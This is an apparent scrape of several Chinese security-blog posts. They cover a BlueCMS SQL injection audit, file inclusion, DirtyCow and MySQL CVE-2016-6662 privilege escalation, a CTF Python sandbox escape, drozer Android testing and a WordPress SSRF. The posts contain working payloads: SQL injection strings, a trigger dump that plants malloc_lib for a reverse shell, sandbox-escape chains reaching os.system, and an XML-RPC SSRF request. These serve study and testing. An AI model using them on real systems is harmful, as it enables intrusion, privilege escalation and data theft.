后台登录处其实前台user.php，也存在注入，只是盲注，这里就取简单的后台登录验证处admin/login.php 12345678910111213141516171819202122elseif($act == &apos;do_login&apos;)&#123; $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;; $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;; $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0; if($admin_name == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if($admin_pwd == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if(check_admin($admin_name, $admin_pwd))&#123; update_admin_info($admin_name); if($remember == 1)&#123; setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400); setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400); setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400); &#125; &#125;else&#123; showmsg(&apos;xxx&apos;); &#125; showmsg(&apos;xxx&apos;, &apos;index.php&apos;); &#125; 继续跟进check_admin 12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;); if($row[&apos;num&apos;] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; 可以看到这里发生了一次登陆验证，可以通过宽字节注入来做万能密码登陆。 1user_name=admin%65%27+or+1%3D1%23&amp;pwd=123 存入ip造成注入在common.inc.php中可以找到getip()函数 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv(&apos;HTTP_CLIENT_IP&apos;)) &#123; $ip = getenv(&apos;HTTP_CLIENT_IP&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED&apos;); &#125; else &#123; $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; &#125; return $ip;&#125; 再看看调用他的位置 online_ip调用处 看看guest_book.php处存在insert注入，并且可以通过覆盖后面的content，造成数据回显。通过xff传入注入语句或者client ip传入。 结果可以看到 其他位置的注入，不能回显，就不分析了。 总结总体来说，直接可以grep到$_GET、$_POST、$_REQUEST的cms，审计起来会比较轻松。可以先从入口看起，将common,config等文件看一遍，再查找危险函数，数据入口就可审计出几个漏洞来。bluecms暂时审计到这一步，主要找的是SQL注入的漏洞。其他漏洞打算准备另外一套cms来审计:)"},{"title":"【VULNERABLITY】文件包含漏洞详解","permalink":"http://blog.0kami.cn/2016/12/19/old-file-include/","text":"概述很久没有归纳总结知识点了，学了那么多总感觉那么零散，所以准备开始总结这一系列的漏洞详解。一方面是总结一方面也是复习。这篇主要总结一下文件包含漏洞。 文件包含漏洞由于在Web应用开发的过程中，大量代码是可以重复使用的，为了方便使用结合开发语言(如php)的便利，包含重复利用的代码，如果在包含过程中，路径或请求的url可控且没有做任何的安全处理，就容易发生文件包含漏洞。文件包含漏洞包括 本地文件包含 远程文件包含 下面主要讲的文件包含在php中的应用，毕竟php是世界上最好的语言，23333333ps:其他语言，遇到了再补充 远程文件包含这里先讲一下远程文件包含RFI（Remote File Include），顾名思义，远程文件包含就是，Web应用程序请求远程的资源，进行一个包含利用。一些猥琐的过马一句话木马就是利用这种方式进行一个恶意代码的包含。在php中造成远程文件包含，首先需要配置文件中allow_url_include=On默认不开启，以及远程读取文件allow_url_fopen=On，满足这些条件，我们再来看看有哪些触发远程文件包含的php函数。12345678910//读取远程文件内容fopen()copy()file_get_content()//包含远程文件代码include()include_once()require()require_once()//可能会有遗漏，小伙伴如果知道还有其他的可以email我：） 前面读取远程文件内容，可能会出现在上传头像处，存取远程头像。后者危害可能更大，直接包含恶意代码执行导致任意代码执行。 远程包含支持的协议在满足配置文件的要求下，使用php支持使用http、https(存在openssl扩展时)、ftp、php://input、"},{"title":"【CVE-2016-5195】Dirtycow","permalink":"http://blog.0kami.cn/2016/10/26/old-dirtycow-cve-2016-5195/","text":"概述最近出来的dirtycow，影响版本:Linux kernel &gt;= 2.6.22（2007年发行，到今年10月18日才修复）,用网上的EXP试了一下，记录一下过程 EXPhttps://www.exploit-db.com/exploits/40616/这个EXP是exploitdb上的，但是容易造成系统崩溃，成功后会返回一个root权限的shell 123456789101112131415okami@ubuntu14:~$ ./dirtycowDirtyCow root privilege escalationBacking up /usr/bin/passwd.. to /tmp/bakSize of binary: 47032Racing, this may take a while..thread stoppedthread stopped/usr/bin/passwd is overwrittenPopping root shell.Don&apos;t forget to restore /tmp/bakroot@ubuntu14:/home/okami# iduid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)root@ubuntu14:/home/okami# whoamirootroot@ubuntu14:/home/okami# https://github.com/scumjr/dirtycow-vdso这个EXP不会出现系统崩溃，但是作者本人说不适用于所有linux版本，不过试验了一下，ubuntu14 16 centOS7都可以123456789101112131415161718192021okami@ubuntu14:~$ ./0xdeadbeef[*] exploit: patch 1/2[*] vdso successfully backdoored[*] exploit: patch 2/2[*] vdso successfully backdoored[*] waiting for reverse connect shell...[*] enjoy![*] restore: patch 2/2[*] vdso successfully restored[*] restore: patch 1/2[*] vdso successfully restorediduid=0(root) gid=0(root) groups=0(root)whoamirootlsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.5 LTSRelease: 14.04Codename: trusty 注意这里有一步是waiting for reverse connect shell…，需要一点时间，成功后有root权限的shell"},{"title":"【CVE-2016-6662】MYSQL提权分析","permalink":"http://blog.0kami.cn/2016/09/18/old-cve-2016-6663-mysql-exp/","text":"概述几天前出了mysql本地提权的0day，虽然现在官方已经出了补丁，但是受影响的主机还是挺多的。跟进操作一遍：） 漏洞影响1234567MySQL &lt;= 5.7.15 远程代码执行/ 提权 (0day) 5.6.33 5.5.52Mysql分支的版本也受影响,包括： MariaDB PerconaDB 实验分析这次实验主要使用docker搭建环境，有需要的同学可以pull我的库玩0kami/vulenv:cve-2016-6663实验主要从attacker的角度入手，预先拥有的权限：1234mysql 账户拥有file权限 bob/bobexp mysql_hookandroot_lib.cmysql-server-5.6my.cnf可被mysql组改写写 先查看一下版本信息将/etc/mysql/my.cnf权限修改掉创建bob用户，并赋予file，select，insert权限，创建用于实验的数据库activedb和表active_table将exp先写入tmp目录，并编译成so文件，需要修改一下ip，port和my.cnf的位置gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl最后一步就是准备一下active_table的触发器了，我们可以现在自己电脑上root用户权限下生成一个tragger在activedb数据下会生成一个触发器到此位置我们所有的准备工作都做好了。让我们用bob用户来弹个shell吧1select &quot;TYPE=TRIGGERS\\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\\nAFTER INSERT\\n ON `active_table` FOR EACH ROW\\nBEGIN\\n DECLARE void varchar(550);\\n set global general_log_file=\\\\\\&apos;/etc/mysql/my.cnf\\\\\\&apos;;\\n set global general_log = on;\\n select \\&quot;\\n[mysqld]\\nmalloc_lib=\\\\\\&apos;/tmp/mysql_hookandroot_lib.so\\\\\\&apos;\\n\\&quot; INTO void; \\n set global general_log = off;\\nEND&apos;\\nsql_modes=1073741824\\ndefiners=&apos;root@localhost&apos;\\nclient_cs_names=&apos;latin1&apos;\\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;; 用bob的用户写入文件产生一个触发器，这个触发器当产生insert时触发来查看一下，执行后的/etc/mysql/my.cnf的内容重启一下数据库，反弹一个shell发现可写的my.cnf会被忽略？？？不知道为什么（难道打补丁了？），不知道5.5的情况会怎么样，所以先把my.cnf的权限改回来744成功反弹一个shell，这边返回的一个shell是mysql权限的 是因为我测试的环境mysqld_safe是以mysql权限运行的，所以弹出来的权限是mysql的，但是如果mysqld_safe是以root权限运行，那么反弹的shell就是root权限的，造成提权。 总结测试环境搭建还有利用过程还是出现了很多问题，可写的my.cnf会被忽略载入（不知道是不是因为修复过的原因），triggers的利用（可以同样利用在拥有file权限的情况下提升权限，这个到时候再深入学习一下）"},{"title":"【VULNERABLITY】python sandbox escape","permalink":"http://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/","text":"概述前几天的华山杯出了一道python的沙盒逃逸，感觉挺有意思的。在网上搜索了一下，发现很早就出过这种类型的题，源码都差不多。学习了一下思路，这里总结一下：） 介绍沙盒源码如下：123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom __future__ import print_functionprint(\"Welcome to my Python sandbox! Enter commands below!\")banned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys() targets.remove('raw_input') targets.remove('print') for x in targets:# 去除所有内置函数除print raw_input del __builtins__.__dict__[x]while 1: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"No bueno\") break else: # this means nobreak exec data 不能出现banned列表中的字符，但是需要读取flag文件内容。 原理绕过前面的限制，我们来一步一步看payload 方法一123456&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &apos;dict&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; 首先python的内置对象有一个class属性来存储类型，我们往上找他的父类使用base属性123456&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt; 可以看到返回object对象，因为python中一切均为对象，均继承object对象，得到object之后我们就可在通过属性subclasses来查看object的子类（包括所有的内置类）12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;] 回到我们的主要目的上，我们需要读取flag文件中的内容，在这些子类中有哪些是可以用来读取文件内容的呢？答案是file子类，首先查找一下file子类的位置。12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)40 这样我们就可以通过这个来建立一个file类的别名读文件啦：）12&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read() ？？？没有任何内容打印出来，但是他没有报错说明存在flag.txt文件，我们尝试用他给的print函数来打印12&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())This is a Flag&#123;enjoy_yourself_ctfer&#125; 得到flag 方法二同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽12&gt;&gt;&gt; import osNo bueno 我们得想其他办法来获取shell。通过上面的思路，我们需要找一个子类他能调用os模块，这里用到了warnings.catch_warnings类1234567&gt;&gt;&gt; import warnings&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]&lt;class &apos;warnings.catch_warnings&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;] 接下来再找linecache1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)25&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;] 可以看到这里可以调用os模块，接下来就调用system函数了1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)144 整理一下123456789101112&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&gt;&gt;&gt; a&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)&gt;&gt;&gt; s144&gt;&gt;&gt; s=a.__dict__.keys()[144]&gt;&gt;&gt; s&apos;system&apos;&gt;&gt;&gt; s=a.__dict__.values()[144]&gt;&gt;&gt; s(&apos;pwd&apos;)/home/xxxx/Desktop/code/python-code/test 好了现在可以执行系统命令了，cat一下flag12&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)This is a Flag&#123;enjoy_yourself_ctfer&#125; 总结通过上面的python沙盒逃逸，发现读python官网手册还是很有必要的，找个时间一点一点看：）共勉 参考https://hexplo.it/escaping-the-csawctf-python-sandbox/"},{"title":"【MOBILE】how to install drozer on mac","permalink":"http://blog.0kami.cn/2016/08/20/old-how-to-install-drozer-on-mac/","text":"一：概述drozer是一款针对Android系统的安全测试框架。drozer可以帮助Android app和设备变得更安全，其提供了很多Android平台下的渗透测试exploit供你使用和分享。对于远程的exploit，它可以生成shellcode帮助你进行远程设备管理。 更快的Android安全评估drozer可以大大缩减Android安全评估的耗时，通过攻击测试暴露Android APP的漏洞。 基于真机的测试drozer运行在Android模拟器和真实设备上，它只需要USB调试即可使用。 自动化和扩展drozer有很多扩展模块，你可以找到他们进行测试以发现Android安全问题。 二：安装drozer下载链接：https://github.com/mwrlabs/drozer window和Linux下的安装要简单的多，但是在mac上安装时遇到了一些错误，因此将自己的安装步骤记录下来。 因为是用python写的，所以Mac可以下载python.egg文件进行安装。但是想通过easy_install安装，必须拥有以下这些模块： 123456789101112cffi==1.1.2cryptography==0.9.3drozer==2.3.4enum34==1.0.4idna==2.0ipaddress==1.0.14protobuf==2.4.1pyasn1==0.1.8pycparser==2.14pyOpenSSL==0.13six==1.9.0Twisted==10.2.0 而安装过程中主要的错误是由pyOpenSSL造成的。 1.1 安装openssl12$ brew uninstall openssl #if installed already$ brew install openssl 1.2 编译pyOpenSSL不幸的是在后面安装Python.egg还是会报错,原因是Drozer需要特殊版本的openssl，我们需要下载 pyOpenSSL v0.13，然后用sed指令修复typo，具体指令：1234$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz$ tar xzvf pyOpenSSL-0.13.tar.gz$ cd pyOpenSSL-0.13$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c 接下来我们build OpenSSL，这里需要指明本机中OpenSSL headers文件的位置：123$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include$ python setup.py build$ python setup.py install 1.3 安装其他支撑文件终于进入安装说明文档中的步骤了12$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works 1.4 安装drozer最后一步，install drozer1$ sudo easy_install ./drozer-2.3.4-py2.7.egg 1.5 runnning此时可以在任何目录下使用drozer 命令啦！ 三：Drozer入门— 获取App Package信息此处以sieve.apk为例 drozer每个模块的作用： 获取App包信息的模块是 ** app.package.* : 2.1 获取获取Android设备上的所有的安装的App的包名命令是：1run app.package.info -a com.mwr.example.sieve run app.package.list 这条命令会把所有的App都列出来，如果想具体查找某个App可加上-f [App关键字]的参数，如查找sieve在Android设备中的包名：1run app.package.list -f sieve 2.2 获取Sieve的一些基本信息1run app.package.info -a com.mwr.example.sieve 2.3 Itentify The Attack Surface(确定攻击面)这个测试教程主要关注的是Android 固有的IPC通信机制的脆弱性，这些特点导致了App泄漏敏感信息给同一台设备上的其它App。 查找可以进行Attack Surface的组件的命令：1run app.package.attacksurface com.mwr.example.sieve 结果显示了潜在可以利用的组件个数： “exported”表示组件可以被其他App使用。 services is debuggable表示我们可以用adb绑定一个调试器到进程。 2.4 进一步获取Attack Surface的信息如进一步获取ativity组建的attack surface信息的命令是：1run app.activity.info -a com.mwr.example.sieve 2.5 启动Activities上图的PWList和FileSelectActivity是exported并且不需要任何权限，我们可以用drozer启动他们，比如感觉PWList这个含金量应该大一点，所以就启动它了，命令是：1run app.activity.start –component com.mwr.example.sieve com.mwr.example.sieve.PWList 2.6 从Content Provider中获取信息接上2.3节，进一步获取content provider的attact surface的信息的命令是：1run app.provider.info -a com.mwr.example.sieve 从上图可以看到2.3节中两个exported的content provider的具体信息，包括名字，权限，访问路径等。 2.6.1 查找可以访问Content Provider的URI（数据泄漏）从上节图中我们猜测DBContentProvider会有某种格式的数据库，但是我们不知道其中的数据是如何组织的。Content URI必须是 “content:///” 的形式,因此我们可以构造部分的content URIs来访问DBcontent Provider。 上图存在一个需要READ_KEYS和WRITE_KEYS权限才能读和写的“/Keys”的路径。drozer的scanner模块提供了一些方法去猜测可能存在的content URIs：1run scanner.provider.finduris -a com.mwr.example.sieve 上图中检测出了可以访问content的URI，接下来我们可以用drozer的其他模块和URI从content中获取，甚至更改信息。 如：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical 如上图我们获取了用户名，邮箱帐号，和Base64编码的密码字符串。 2.6.2 进行SQL注入Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。 使用projection参数和seleciton参数可以传递一些简单的SQL注入语句到Content provider。如：123run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘”run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘” 上面两条命令执行后Android设备返回了非常详细的错误信息。使用Sql注入列出数据库中的所有数据表：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM SQLITE_MASTER WHERE type=’table’;–“ 使用SQL注入列出数据表的内容：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“ 使用SQL注入列出数据表的内容：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“ 2.6.3 从File System-Backed Content Providers获取信息File System-backed Content Provider提供了访问底层文件系统的方法，Android沙盒会阻止App共享文件允许，而File System-backed Content Provider允许App共享文件。 对于sieve来说，我们可以推测出的FileBackupProvider就是一个file system-backed content provider。 我们可以使用drozer的app.provider.read模块查看某个文件：1run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 可以使用app.provider.download下载文件1run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db 2.6.4 检查Content Provider的脆弱性检查是否有SQL注入：1run scanner.provider.injection -a com.mwr.example.sieve 检查是否存在遍历文件的漏洞1run scanner.provider.traversal -a com.mwr.example.sieve 总结体会：我觉得在刚开始获取了软件包的基本信息后，就先用模块scanner里面的工具扫一扫，找到一些漏洞或者利用点后再进行下一步。 2.7 和Services交互获取是exported状态的services的命令：1run app.service.info -a com.mwr.example.sieve 关于Services的模块：如向某个服务发送信息：1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3 2.8 其他常用模块 shell.start 在Android设备上开启一个交互式Linux Shell tools.file.upload / tools.file.downloa tools.setup.busybox / tools.setup.minimalsu 安 装busybox或者minimalsu到Android设备上 参考链接：https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"},{"title":"【Code Analysis】wordpress SSRF <4.5","permalink":"http://blog.0kami.cn/2016/08/19/old-wordpress-ssrf-4-4-2/","text":"概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。 ip地址的几种表示方式ip地址域名有多种表示方式，浏览器都能识别出来。 常见的ip地址域名表示方法 点分十进制表示法，例如192.168.1.2 二进制表示法例如11000000101010000000000100000010，表示192.168.1.2 非常见ip地址域名表示方法 整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问http://3232235778 解析为192.168.1.2，除此之外还可以通过公式192*256^3+168*256^2+1*256+2=3232235778换算 八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制 十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制 混合型：即以上的几种方式的结合，0300.0xA8.1.0x02 下面就是通过八进制绕过检测。 代码详情漏洞成因处508 wp_http_validate_url 函数1234567891011121314151617......if ( ! $same_host ) &#123; $host = trim( $parsed_url['host'], '.' ); if ( preg_match( '#^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;$#', $host ) ) &#123; $ip = $host; &#125; else &#123; $ip = gethostbyname( $host ); if ( $ip === $host ) // Error condition for gethostbyname() $ip = false; &#125; if ( $ip ) &#123; $parts = array_map( 'intval', explode( '.', $ip ) ); if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0] || ( 172 === $parts[0] &amp;&amp; 16 &lt;= $parts[1] &amp;&amp; 31 &gt;= $parts[1] ) || ( 192 === $parts[0] &amp;&amp; 168 === $parts[1] ) ) &#123; ...... 这里的代码通过正则表达式^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$判断ip是否合法，如果不合法则通过网络获取ip的值。下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。123456if ( empty( $parsed_url['port'] ) ) return $url; $port = $parsed_url['port']; if ( 80 === $port || 443 === $port || 8080 === $port ) return $url; 再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf 利用利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。POC123456789101112131415161718POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 321&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; 这里设置10.10.10.111为受害者 总结在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。 参考http://xlab.baidu.com/wordpress/https://virusdefender.net/index.php/archives/733/"},{"title":"【VULNERABLITY】文件上传学习总结","permalink":"http://blog.0kami.cn/2016/07/04/old-file-upload/","text":"概述这几天空下来根据上传攻击框架学习总结一下上传攻击。 上传检测流程 客户端javascript检测（检测文件扩展名为主） 服务端MIME类型检测（检测Content-type内容） 服务端目录路劲检测（检测跟path相关的内容） 服务端文件扩展名检测（检测跟文件后缀相关的内容） 服务端文件内容检测（检测内容是否合法或含有恶意代码） 